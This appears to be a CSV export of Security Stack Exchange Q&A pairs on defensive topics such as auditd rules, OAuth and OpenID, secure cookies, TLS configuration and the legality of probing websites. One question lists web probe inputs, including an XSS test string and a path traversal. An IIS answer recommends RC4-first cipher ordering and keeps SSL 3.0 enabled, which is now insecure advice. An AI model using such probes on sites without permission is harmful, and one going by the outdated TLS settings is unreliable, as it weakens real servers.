","<p>Any site that claims to be able to do that <a href=""http://spyzrus.net/remote-install-cell-spy-software-exposed/"">is a scam</a>.  Such technology would have to exploit some kind of backdoor, and if such a backdoor exists, it would only be known to law enforcement.  If knowledge of such a backdoor leaks, you can be sure that there would be a media frenzy over it, and the vulnerability would quickly be fixed.</p>

<p>Phone monitoring software exists, but all of the legitimate ones require either physical access to the phone to install, or finding a way to deceive the owner into installing it.</p>
","72590"
"Monitoring file access on Windows","51863","","<p>I need a way to monitor user file access on windows. What I need is:</p>

<ul>
<li>monitoring of user opening, modifying (don't need to know what the changes were, just that a file was modified), copying, pasting and renaming files</li>
<li>file access monitoring on shared drives that user has access to</li>
<li>file access monitoring on local drives is a plus</li>
<li>needs to run in background (needs to be out of reach of a non-privileged user)</li>
<li>some kind of reporting is a plus</li>
<li>if no reporting capability is provided it needs to have log exporting capability and logs need to be ""parseable"" (and not in some ""wild"" format that has no logic/structure)</li>
<li>including/excluding folders that need to be monitored is a plus</li>
</ul>

<p>Is there such a tool for windows?</p>

<p>I found <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645"">process monitor</a>, but I could not find a way to run it in background and I would have to create a programm to create some kind of report out of procmon logs. </p>

<p>Any other tools I should check out?</p>
","<p>The built in windows auditing can do this if you're running a domain, or at least windows 2003/Vista and are willing to set it up in group policy. Enable object access auditing and then set up the files and folders you want to audit. There are a large nunber of tools that can then read and sort/filter the windows logs ... I'm a fan of GFI EventsManager, but there are a lot of options.</p>

<p>A basic blog on the how to setup is here:<a href=""http://web.archive.org/web/20131228033843/http://www.neondemon.com/archives/how-to-monitor-file-and-folder-access-on-a-windows-file-server"" rel=""nofollow"">How to monitor file and folder access on a windows file server</a></p>
","6704"
"Why use OpenID Connect instead of plain OAuth2?","51760","","<p>I just started to use <a href=""https://en.wikipedia.org/wiki/OAuth"" rel=""noreferrer"">OAuth 2.0</a> as a way to authenticate my users. It works great - I just use the identity/profile API of each provider to get a validated email address of the user.</p>

<p>Now I read about <a href=""https://openid.net/connect/"" rel=""noreferrer"">OpenID Connect</a> and am a little bit confused. </p>

<p>What is the difference between OpenID Connect and using the identity API over OAuth2? Is it just that I have a standard profile API, so that I don't have to worry whether I get an <code>""email""</code> or an <code>""emails""</code> JSON back? </p>

<p>Or is there more to it, which makes the OpenID Connect approach more secure than my first approach?</p>
","<p>OpenID connect will give you an access token plus an <a href=""http://openid.net/specs/openid-connect-core-1_0.html#IDToken"">id token</a>. 
The id token is a <a href=""http://jwt.io/"">JWT</a> and contains information about the authenticated user. It is signed by the identity provider and can be read and verified without accessing the identity provider. </p>

<p>In addition, OpenID connect standardizes quite a couple things that oauth2 leaves up to choice. for instance scopes, endpoint discovery, and dynamic registration of clients. </p>

<p>This makes it easier to write code that lets the user choose between multiple identity providers. </p>
","47136"
"Simple example auditd configuration?","51719","","<p><a href=""http://people.redhat.com/sgrubb/audit/"" rel=""nofollow noreferrer"">Auditd</a> was recommended in an answer to <a href=""https://security.stackexchange.com/questions/4607/linux-command-logging"">Linux command logging?</a></p>

<p>The default install on Ubuntu seems to barely log anything.  There are several examples that come with it (capp.rules, nispom.rules, stig.rules) but it isn't clear what the performance impact of each would be, nor what sort of environment or assumptions each would be best suited for.</p>

<p>What would be the best starting point for deploying auditd on, lets say, a web server?  This would include an audit.rules file, settings to enable sending the audit log stream to a remote machine in real time, and the simplest of tools to see what has been logged.</p>

<p>Next, how about a typical desktop machine?</p>

<p><em>Update</em>: dannysauer notes that for security it is important to start with the goal, and I agree.  But my main intent is to spark some more useful explanations of the usage of this tool, and see a <strong>worked example</strong> of it in action, together with performance and storage implications, etc.  If that already exists and I missed it, please point to it.  If not, I'm suggesting that an example be created for one of the more common scenarios (e.g. a simple web server, running your stack of choice), where the goal might be to preserve information in case of a break-in to help track back to find out where the penetration started.  If there is a more suitable or attainable goal for use in e.g. a small business without a significant IT staff, that would help also.</p>
","<p>Auditd is an extraordinarily powerful monitoring tool. As anyone who has ever looked at it can attest, usability
is the primary weakness. Setting up something like auditd requires a lot of pretty in-depth thought about exactly
<em>what</em>  it is that needs auditing on the specific system in question. In the question you decided on a web server
as our example system, which is good since it's specific. </p>

<p>For sake of argument let's assume that there is a formal division between test/dev web servers and production
web servers where web developers do all of their work on the test/dev systems and changes to the production
environment are done in a controlled deployment.</p>

<p>So making those rather large assumptions, and focusing on the production system, we can get down to work. Looking at the auditd recommendation in the
<a href=""http://benchmarks.cisecurity.org/tools2/linux/CIS_RHEL5_Benchmark_v1.1.pdf"">CIS benchmark for RHEL5</a> we can start building out the following suggested ruleset:</p>

<pre><code>-a exit,always -S unlink -S rmdir
-a exit,always -S stime.*
-a exit,always -S setrlimit.*
-w /etc/group -p wa 
-w /etc/passwd -p wa 
-w /etc/shadow -p wa 
-w /etc/sudoers -p wa
-b 1024
-e 2
</code></pre>

<p>This will cause logs to be written out whenever the rmdir, unlink, stime, or setrlimit system calls exit. This should 
let us know if anyone attempts to delete files or jigger with the times. We also set up specific file watches on the
files that define groups, users, passwords, and sudo access. Instead of looking at system calls for each of those an 
audit log will be written every time one of those files is either:</p>

<ol>
<li>opened with the O_WRONLY or O_RDWR modes</li>
<li>an attribute is changed</li>
</ol>

<p>Since we've already made the assumption that we're talking about a production web server, I would recommend adding the line:</p>

<pre><code>-w /var/www -p wa
</code></pre>

<p>This will recursively watch all of the files under the <code>/var/www</code> directory tree.</p>

<p>Now we can see the reason for the ""controlled environment"" assumption made earlier. Between monitoring all files in 
the web root, as well as all unlink or rmdir events, this could be prohibitively noisy in a development environment. If
we can anticipate filesystem changes, such as during maintenance windows or deploy events, we can more reasonably filter
out this noise.</p>

<p>Combining all of this into a single, coherent, file we would want <code>/etc/audit/audit.rules</code> to look like</p>

<pre><code># This file contains the auditctl rules that are loaded
# whenever the audit daemon is started via the initscripts.
# The rules are simply the parameters that would be passed
# to auditctl.

# First rule - delete all
-D

# Increase the buffers to survive stress events.
# Make this bigger for busy systems
-b 1024

-a exit,always -S unlink -S rmdir
-a exit,always -S stime.*
-a exit,always -S setrlimit.*
-w /var/www -p wa
-w /etc/group -p wa
-w /etc/passwd -p wa
-w /etc/shadow -p wa
-w /etc/sudoers -p wa

# Disable adding any additional rules - note that adding *new* rules will require a reboot
-e 2
</code></pre>
","5226"
"Trace source and destination of an SMS message","51406","","<p>Is it possible to trace the source or destination (location, even coordinates) of an SMS message ?
If it is, is it possible to do it even if the phone is roaming in a different country ?</p>
","<p>There is no location transmitted within a normal SMS message (unless added by the author) so as the recipient of an SMS you won't normally be able to determine the location of the sender.</p>

<p>The location of a cell phone can be determined with varying precision by the Mobile Network Operator and any third parties with access to the MNO's system or data.  The location precision depends on the capabilities of the device, the cell tower(s) it connects to and the quality of the signal.</p>

<p>A determined and well equipped attacker may able to determine the location of cell phone independently of the MNO (by <a href=""https://security.stackexchange.com/questions/5997/smartphone-gsm-sniffer"">sniffing local cell traffic</a>, using a <a href=""https://security.stackexchange.com/questions/11785/sms-voice-call-interception-with-a-fake-base-station"">fake cell tower</a> or side channel attack such as observing the wifi or bluetooth connections of the device, implanting malware on the device etc) and pair this with the timestamp of the message.  (It may also be possible for an attacker to read the mssages, since the A5 stream cipher used to encrypt the message between phone and base station <a href=""https://security.stackexchange.com/questions/35376/are-phone-calls-on-a-gsm-network-encrypted"">has been shown to be vulnerable</a>).</p>

<p>One other thing to consider is that there are many different ways of sending an SMS and normal mobile phones are only one of these.  For example, MNOs and a very large number of third parties will forward SMS messages which originated from email or web based gateways. In many countries fixed line telephones can send SMS if configured correctly.</p>

<p>The location of the sending device may not correspond the location of actual person either. Many devices can be configured to send SMS without having any operator physically present (uses for that include alarm systems, vehicle trackers etc).</p>
","58916"
"What are the differences between dictionary attack and brute force attack?","51317","","<p>Can someone explain the major differences between a Brute force attack and a Dictionary attack. Does the term <code>rainbow table</code> has any relation with these?</p>
","<p><strong>Similarities</strong>
Both a dictionary and brute force attack are guessing attacks; they are not directly looking for a flaw or bypass. Either can be an offline attack or an online attack. </p>

<p>An <em>online attack</em> tries automated routines providing input to a legitimate system. They are not looking to create an exploit in functionality, but to <em>abuse expected functionality</em>. </p>

<p>An <em>offline attack</em> attempts to emulate the encryption/hashing and requires a known output of that process (i.e., you don't attack the system, you already have the hashed/encrypted password)</p>

<hr>

<h1><strong>Brute Force</strong> Attack</h1>

<p><strong>Definition:</strong> Attempts to determine a secret by trying <em>every possible combination</em>. </p>

<p><strong>Qualities:</strong></p>

<ul>
<li>The number of attempts is limited by the maximum length and the number of characters to try per position (or byte if considering Unicode passwords)</li>
<li>The time to complete is greater, but there is greater coverage of likely cleartext value (all possibilities only if set to the maximum length and every possible character is considered in every position)</li>
</ul>

<p><strong>Physical World Example:</strong> Given a combination lock which requires three numbers to be taken in sequence, you try every possible combination - e.g., First 1-2-3, then 1-2-4.</p>

<p>Note, a brute force attack may not necessarily try all options in sequential order.  An advanced brute force attack may make certain assumptions, e.g., complexity rules require uppercase, first character more likely to be upper than lower case).</p>

<hr>

<h1><strong>Dictionary</strong> Attack</h1>

<p><strong>Definition:</strong> Typically, a guessing attack which uses precompiled list of options. Rather then trying every option, only try complete options which are likely to work.</p>

<p><strong>Qualities:</strong></p>

<ul>
<li>The dictionary or possible combinations is based upon some likely values and tends to exclude remote possibilities. It may be based on knowing key information about a particular target (family member names, birthday, etc.). The dictionary may be based on patterns seen across a large number of users and known passwods (e.g., whats the most globally likely answers). The dictionary is more likely to include real words that random strings of characters.</li>
<li>The execution time of dictionary attack is reduced because the number of combinations is restricted to those on the dictionary list</li>
<li>There is less coverage and particularly good password may not be on the list and will therefore be missed.</li>
</ul>

<p><em>Real World Examples:</em></p>

<ul>
<li>Access to a secret club requires knowing the owner's name, you guess ""Rob"" or ""Jake"" rather than ""computer""</li>
<li>Given the same lock example above, you try a combinations equating to the birthday of the lock owner or the lock owner's friends and family.  </li>
</ul>

<hr>

<h1>Trade Off</h1>

<p>The main trade off between the two attacks is coverage versus time to complete. If you have a reasonable thought about what the password will be, you can skip unlikely answers and get a response in a faster amount of time. This is important because passwords are often subject to change and because as password length increases the time to guess every possibility grows really, really fast.</p>

<h2>Hybrids</h2>

<p>There are of course attacks which leverage both techniques in the interest of balancing the tradeoff. For example, if the attacker believes a user is likely to form a password by concatenating a dictionary word and then adding a number (which he increments each time he is required to change his password), then the guesses being executed may combine the word list and then append numbers (e.g., ""mypassword2014"" and then ""mypassword2015""). Hybrids may also combine words in a brute force manner: Consider a requirement for a user to change his password every 90 days, he may form passwords like ""mypasswordsummer"" and then ""mypasswordfall"". The attacker then builds a hybrid attack which will take a dictionary word and then append other dictionary terms (potentially the same of different dictionaries) to make guesses.</p>

<hr>

<h1>Rainbow Table versus Dictionary/Brute Force</h1>

<p>A rainbow table is generally an offline only attack. In a brute force attack or dictionary attack, you need to spend time either sending your guess to the real system to running through the algorithm offline. Given a slow hashing or encryption algorithm, this wastes time. Also, the work being done cannot be reused.</p>

<p>A rainbow table is pre-computer listing. You actually work backwards from the hashed/encrypted text. The attacker will run through the algorithm to get every possible output given every possible input. The list of input may be brute force, dictionary, or hybrid. Based on the list of outputs, the attacker now has a reuseable table mapping knowing inputs to known outputs. </p>

<p>With the precomputed table, a simple lookup is now possible given the encrypted/hashed version of the password. If you can find the victim's encrypted/hashed version you can easily return the real plaintext password. Rainbow tables are used to reduce redudant work. There is a trade off with doing the work up front and to store the tables. For example, if you were just doing a brute force or a dictionary attack, you can stop as soon as you find your answer. However, the rainbow table must be fully calculated. </p>

<p>If you were to run a a rainbow table attack and the 5th entry out of 500 million entries was your match, then all of the effort and time used to create the other 499,999,995 passwords may be considered wasted. However, if you are looking to break multiple passwords to reuse the table over multiple attacker, the time savings can add up.</p>
","67768"
"How to ensure that cookies are always sent via SSL when using ASP.NET on IIS 7.5?","51304","","<p>Firesheep has brought the issue of insecure cookie exchanges to the forefront. </p>

<p>How can you ensure that all cookie exchanges are forced to occur only via an SSL-secured connection to the server when you're communicating to a web user? </p>

<p>Our scenario is that the web app is written in ASP.NET 4.0 and hosted on Windows Server 2008 R2 running IIS 7.5 if that narrows the scope some.</p>
","<p>You can use <a href=""https://msdn.microsoft.com/en-us/library/ms228262%28v=vs.100%29.aspx"" rel=""noreferrer"">app.config</a> to force it; the format is (in the <code>&lt;system.web&gt;</code> section)</p>

<pre><code>&lt;httpCookies domain=""String""
             httpOnlyCookies=""true|false"" 
             requireSSL=""true|false"" /&gt;
</code></pre>

<p>so you really want, at a minimum</p>

<pre><code>&lt;httpCookies requireSSL='true'/&gt;
</code></pre>

<p>But preferably you'll also turn httpOnlyCookies on, unless you're doing some really hooky javascript.</p>
","1567"
"SSL3 error when requesting connection using TLS 1.2","51005","","<p>I've come across several hosts that throw SSL3 handshake errors even though I explicitly request TLS 1.2. Why is this? Am I using the <code>openssl</code> client wrong?</p>

<pre>
$ openssl s_client -tls1_2 -connect i-d-images.vice.com:443
CONNECTED(00000003)
140735150146384:error:14094410:SSL routines:ssl3_read_bytes:sslv3 alert handshake failure:s3_pkt.c:1472:SSL alert number 40
140735150146384:error:1409E0E5:SSL routines:ssl3_write_bytes:ssl handshake failure:s3_pkt.c:656:
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 7 bytes and written 0 bytes
---
New, (NONE), Cipher is (NONE)
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : 0000
    Session-ID: 
    Session-ID-ctx: 
    Master-Key: 
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1444078671
    Timeout   : 7200 (sec)
    Verify return code: 0 (ok)
---
</pre>
","<p>In SSL/TLS, the client does not request a specific protocol version; the client <em>announces</em> the maximum protocol version that it supports, and then the server chooses the protocol version that will be used. Your client does not tell ""let's use TLS 1.2""; it says ""I know <em>up to</em> TLS 1.2"".</p>

<p>A client <em>may</em> have its own extra requirements, but there is no room to state them in the <code>ClientHello</code> message. If the client wants to do TLS 1.2 only, then he must announce ""up to TLS 1.2"" in its <code>ClientHello</code>, <em>and</em> also close the connection if the server responds with a message that says anything else than ""let's do TLS 1.2"". In your case, things did not even reach that point: the server responded with a fatal alert 40 (""handshake_failure"", see <a href=""http://tools.ietf.org/html/rfc5246#section-7.2"">the standard</a>). As @dave_thompson_085 points out, this is due to a lack of <a href=""https://en.wikipedia.org/wiki/Server_Name_Indication"">SNI</a>: this is an extension by which the client documents in its <code>ClientHello</code> message the <em>name</em> of the target server. SNI is needed by some servers because they host several SSL-enabled sites on the same IP address, and need that parameter to know which certificate they should use. The command-line tool <code>openssl s_client</code> can send an SNI with an explicit <code>-servername</code> option.</p>

<p>As @Steffen explained, SSL 3.0 and all TLS versions are quite similar and use the same record format (at least in the early stage of the handshake) so OpenSSL tends to reuse the same functions. Note that since the server does not respond with a <code>ServerHello</code> at all, the protocol version is not yet chosen, and SSL 3.0 is still, at least conceptually, a possibility at that early point of the handshake.</p>
","102018"
"How to fix SSL 2.0 and BEAST on IIS","50668","","<p>As you can see on this post <a href=""http://diniscruz.blogspot.co.uk/2012/04/teammentornet-vulnerable-to-beast-and.html"" rel=""nofollow noreferrer"">TeamMentor.net vulnerable to BEAST and SSL 2.0, now what?</a> the app I'm currently development got flagged for SSL 2.0 and BEAST by SSL Labs.</p>

<p>I'm using IIS 7.0 with the latest patches, and can't seem to find the answers to these questions:</p>

<ul>
<li>What is the risk impact of this vulnerability on a site like
<a href=""http://teammentor.net"" rel=""nofollow noreferrer"">http://teammentor.net</a>? </li>
<li>What are the exploit scenarios? </li>
<li>Is there any mitigation (or not) by the use of IIS 7.0? </li>
<li>How do I fix this in IIS 7.0? </li>
<li>Can anything been done at the Application Layer?</li>
</ul>

<p>For reference here are a couple other security.stackexchange.com questions on this topic:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/10481/next-microsoft-patch-tuesday-include-beast-ssl-fix"">Next Microsoft Patch Tuesday include BEAST SSL fix</a></li>
<li><a href=""https://security.stackexchange.com/questions/7720/should-i-ignore-the-beast-ssl-exploit-and-continue-to-prefer-aes"">Should I ignore the BEAST SSL exploit and continue to prefer AES?</a></li>
<li><a href=""https://security.stackexchange.com/questions/7440/what-ciphers-should-i-use-in-my-web-server-after-i-configure-my-ssl-certificate"">What ciphers should I use in my web server after I configure my SSL certificate?</a></li>
</ul>
","<p>In IIS 7 (and 7.5), there are two things to do:</p>

<ol>
<li><p>Navigate to: Start > 'gpedit.msc' > Computer Configuration > Admin Templates > Network > SSL Configuration Settings > SSL Cipher Suite Order (in right pane, double click to open). There, copy and paste the following (entries are separated by a single comma, make sure there's no line wrapping):</p>

<blockquote>
  <p>TLS_RSA_WITH_RC4_128_SHA,TLS_RSA_WITH_RC4_128_MD5,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256_P521,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384_P521,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P521,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P256,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P521,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P384,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256_P521,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P384,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384_P521,TLS_DHE_DSS_WITH_AES_128_CBC_SHA256,TLS_DHE_DSS_WITH_AES_256_CBC_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_3DES_EDE_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_P256</p>
</blockquote></li>
<li><p>Run the following PowerShell commands as administrator (copy-paste into Notepad, save as 'fix-beast-in-iis.ps1' and run with elevated privileges):</p>

<pre><code>#make TSL 1.2 protocol reg keys
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2""
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server""
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client""

# Enable TLS 1.2 for client and server SCHANNEL communications
new-itemproperty -path     ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server"" -name ""Enabled"" -value 1 -PropertyType ""DWord""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server"" -name ""DisabledByDefault"" -value 0 -PropertyType ""DWord""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client"" -name ""Enabled"" -value 1 -PropertyType ""DWord""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client"" -name ""DisabledByDefault"" -value 0 -PropertyType ""DWord""

# Make and Enable TLS 1.1 for client and server SCHANNEL communications
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1""
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server""
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client"" 
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server"" -name ""Enabled"" -value 1 -PropertyType ""DWord""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server"" -name ""DisabledByDefault"" -value 0 -PropertyType ""DWord""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client"" -name ""Enabled"" -value 1 -PropertyType ""DWord""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client"" -name ""DisabledByDefault"" -value 0 -PropertyType ""DWord""

# Disable SSL 2.0 (PCI Compliance)
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server"" -name Enabled -value 0 -PropertyType ""DWord""
</code></pre></li>
</ol>

<p>Once you've run the script, you can run 'regedit' and make sure the keys in the script were actually created correctly. Then reboot for the change to take effect.</p>

<p>WARNING: Notice I didn't turn off SSL 3.0- the reason for this is due to the fact that, like it or not, there are still people out there using Windows XP with IE 6/7. Without SSL 3.0 enabled, there would be no protocol for those people to fall back on. While you may still not get a perfect on a Qualys SSL Labs scan, the majority of holes should be closed by following the previous steps. If you want absolute PCI compliance, you can copy the lines from the Disable SSL 2.0 section of the Powershell script, paste them at the end of the script and change them to the following:</p>

<pre><code># Disable SSL 3.0 (PCI Compliance)
md ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server""
new-itemproperty -path ""HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server"" -name Enabled -value 0 -PropertyType ""DWord""
</code></pre>

<p>Then, when you run the script, you disable SSL 2.0, SSL 3.0 and enable TLS 1.1 and 1.2.</p>
","19035"
"How to prevent installation of Google Chrome extensions","50638","","<p>How can I prevent the installation of Chrome extensions on desktop?</p>
","<p>You can do this with a GPO. Go to Computer Configuration > Administrative Templates > Google > Google Chrome. Look for a folder named  Allowed extensions. There configure a blacklist of <code>*</code>. This will prevent users from installing plugins.</p>
","66240"
"Is it standard practice to ask a customer to send a photo of their credit card to confirm their identity? ","50416","","<p>My friend ordered clothes from a clothing site and was asked to send a picture of her credit card.</p>

<p>Is it standard practice to ask a customer to send a photo of their credit card to confirm their identity?</p>
","<p>I've seen similar requests coming from foreign sites/companies just because of how they handle credit card payments.Think of credit cards imprinters. Some countries/merchants still use them and somehow they assume that an image of the credit card could be just as valid. </p>

<p>In the situations where I've come across this type of request, I have opted to send payment either via Wire transfer, Paypal or similar services. They were wholesale orders where the card could not be charged until the product was manufactured, etc. </p>
","18246"
"How can I intercept and modify HTTP requests?","49910","","<p>Are there any free tools available that let me intercept and modify HTTP requests for testing?</p>

<p>I am looking for tools which allow me to send custom HTTP headers.</p>
","<p>I personally am partial to Fiddler, a free <a href=""http://www.fiddler2.com/fiddler2/"" rel=""nofollow"">download</a> from MS.<br>
There are many other decent interactive http proxies, but that one serves me the best.  </p>
","227"
"At what point does ""hacking"" become illegal? (US)","49776","","<p><strong>Hypothetical situation:</strong>
before I hire a web development company I want to test their ability to design secure web apps by viewing their previous client's websites.</p>

<p><strong>Issue:</strong>
this situation raises a big red flag: with regards to viewing a website, what is and is not within the breadth of the law? Or in other words: <em>at what point does poking around a website become illegal</em>?  </p>

<ul>
<li>View Source with Firebug? Naturally that would be legal.</li>
<li>But what if I change HTML (like a hidden form value before submission)?</li>
<li>Perhaps I then edit or remove JavaScript, like a client side validation script. Would that be legal?</li>
<li>What if I put %3Cscript%3Ealert(1)%3C/script%3E at the end of the URL. </li>
<li>Or perhaps I type the URL: example.com/scripts/ and I'm able to view their directory due to faulty permission settings?</li>
<li>What if I manipulate data passed in HTTP headers, for instance a negative product qty/price to see if they do server side validation (naturally, I wont complete the checkout).</li>
</ul>

<p>To me, all of this seems perfectly harmless because:</p>

<ol>
<li>I'm not causing undue stress to their server by spamming, mirroring the site with wget, or injecting potentially dangerous SQL.</li>
<li>I'm not causing any potential loss or monetary damages, because I wont ever exploit the vulnerabilities, only test for their existence (proof of concept).</li>
<li>None of my actions will have any implication for user data privacy. In no way would any of my actions potentially reveal confidential or private information about anyone.</li>
<li>If I did find anything I would immediately notify the webmaster of the potential exploit so they could patch it.</li>
</ol>

<p>But even though I am logically able to justify my reasons for testing the site, that does not necessarily make my actions legal. In fact, cyber laws are notoriously backwards in the United States, and even the most laughably trivial actions can be considered hacking.</p>

<p><strong>Questions:</strong>
Is there a defined line in the sand that separates illegal hacking from ""testing without permission""? Or is this whole scenario a grey area that I should avoid (likely the case). Are there any linkable online resources that could expand my knowledge in this wholly grey area? What are the specific <em>acts</em> or <em>laws</em> that handle this?</p>

<p><em>Please keep in mind that the number one most logical choice would be to simply: ask for permissions. However, due to <strong>heavy</strong> time constraints, by the time I would get permission it would all be for naught.</em></p>
","<p>Don't do it!  Don't do it!  If you are in the US, the law is very broad.  You don't want to even tiptoe up to the line.</p>

<p>The relevant law is the Computer Fraud and Abuse Act (18 U.S.C. 1030).  In a nutshell (and simplifying slightly), under the CFAA, it is a federal crime to ""intentionally access a computer without authorization or exceed authorized access"".  This language is very broad, and I imagine an ambitious prosecutor could try to use it to go after everything on your list except #1 (view source).</p>

<p>Orin Kerr, one of the leading legal scholars in this area, calls the statue ""vague"" and <a href=""http://volokh.com/category/computer-fraud-and-abuse-act/"" rel=""nofollow noreferrer"">""extraordinarily broad""</a>, and has said that <a href=""http://volokh.com/2011/05/24/congress-considers-increasing-penalties-adding-mandatory-minimum-sentences-to-the-computer-fraud-and-abuse-act/"" rel=""nofollow noreferrer"">""no one actually knows what it prohibits""</a>.</p>

<p>And, as @Robert David Graham explains, there have been cases where folks were prosecuted, threatened with prosecution, or sued for doing as little as typing a single-quote into a textbox, adding a <code>../</code> to a URL, or signing up to Facebook under a pseudonym.  It's pretty wild that this alone constitutes a federal offense, even if there is no malicious intent.  But that's the legal environment we live in.</p>

<p>I'd say, don't take chances.  Get written authorization from the company whose websites you want to test.</p>
","6370"
"Difference Between OAUTH, OpenID and OPENID Connect in very simple term?","49742","","<p>I am very confused the difficult jargon available in web about OAUTH, OpenID and OPENID Connect. Can anyone tell me the difference in simple words.</p>
","<p><a href=""http://en.wikipedia.org/wiki/OpenID"">OpenID</a> is a protocol for <strong>authentication</strong> while <a href=""http://en.wikipedia.org/wiki/OAuth"">OAuth</a> is for <strong>authorization</strong>. Authentication is about making sure that the guy you are talking to is indeed who he claims to be. Authorization is about deciding what that guy should be allowed to do.</p>

<p>In OpenID, authentication is delegated: server A wants to authenticate user U, but U's credentials (e.g. U's name and password) are sent to another server, B, that A trusts (at least, trusts for authenticating users). Indeed, server B makes sure that U is indeed U, and then tells to A: ""ok, that's the genuine U"".</p>

<p>In OAuth, authorization is delegated: entity A obtains from entity B an ""access right"" which A can show to server S to be granted access; B can thus deliver temporary, specific access keys to A without giving them too much power. You can imagine an OAuth server as the key master in a big hotel; he gives to employees keys which open the doors of the rooms that they are supposed to enter, but each key is limited (it does not give access to all rooms); furthermore, the keys self-destruct after a few hours.</p>

<p>To some extent, authorization can be abused into some pseudo-authentication, on the basis that if entity A obtains from B an access key through OAuth, and shows it to server S, then server S may <em>infer</em> that B authenticated A before granting the access key. So some people use OAuth where they should be using OpenID. <a href=""http://en.wikipedia.org/wiki/OpenID#OpenID_vs._pseudo-authentication_using_OAuth"">This schema</a> may or may not be enlightening; but I think this pseudo-authentication is more confusing than anything. <a href=""http://openid.net/connect/"">OpenID Connect</a> does just that: it abuses OAuth into an authentication protocol. In the hotel analogy: if I encounter a purported employee and that person shows me that he has a key which opens my room, then I <em>suppose</em> that this is a true employee, on the basis that the key master would not have given him a key which opens my room if he was not.</p>
","44614"
"Lessons learned and misconceptions regarding encryption and cryptology","49550","","<p>Cryptology is such a broad subject that even experienced coders will almost always make mistakes the first few times around.  However encryption is such an important topic, often we can't afford to have these mistakes. </p>

<p>The intent of this question is to identify and list what <em>not</em> to do with a given algorithm or API.  This way we can learn from other's experiences and prevent the spread of bad practices.</p>

<p>To keep this question constructive, please </p>

<ol>
<li>Include a ""wrong"" example</li>
<li>Explain what is wrong with that example</li>
<li>Provide a correct implementation (if applicable). </li>
<li>To the best of your ability, provide references regarding #2 and #3 above.</li>
</ol>
","<p><strong>Don't roll your own crypto.</strong></p>

<p>Don't invent your own encryption algorithm or protocol; that is extremely error-prone.  As Bruce Schneier likes to say, </p>

<blockquote>
  <p>""Anyone can invent an encryption algorithm they themselves can't break; it's much harder to invent one that no one else can break"".  </p>
</blockquote>

<p>Crypto algorithms are very intricate and need intensive vetting to be sure they are secure; if you invent your own, you won't get that, and it's very easy to end up with something insecure without realizing it.</p>

<p>Instead, use a standard cryptographic algorithm and protocol.  Odds are that someone else has encountered your problem before and designed an appropriate algorithm for that purpose.</p>

